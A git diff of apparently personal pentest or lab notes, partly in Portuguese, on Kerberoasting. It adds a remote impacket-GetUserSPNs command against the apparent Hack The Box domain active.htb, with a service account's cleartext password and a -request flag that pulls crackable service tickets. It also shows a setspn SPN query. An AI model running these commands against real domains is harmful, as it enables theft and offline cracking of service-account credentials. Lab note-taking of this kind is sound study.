@@ -5,7 +5,11 @@ Kerberoasting
 setspn -T scrm.local -Q */*
 ```
 
-impacket
+Remotelly
+
+    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request
+
+
 
 Temos que focar no que for contas de serviço que não seja de máquinas, conforme print abaixo:
 
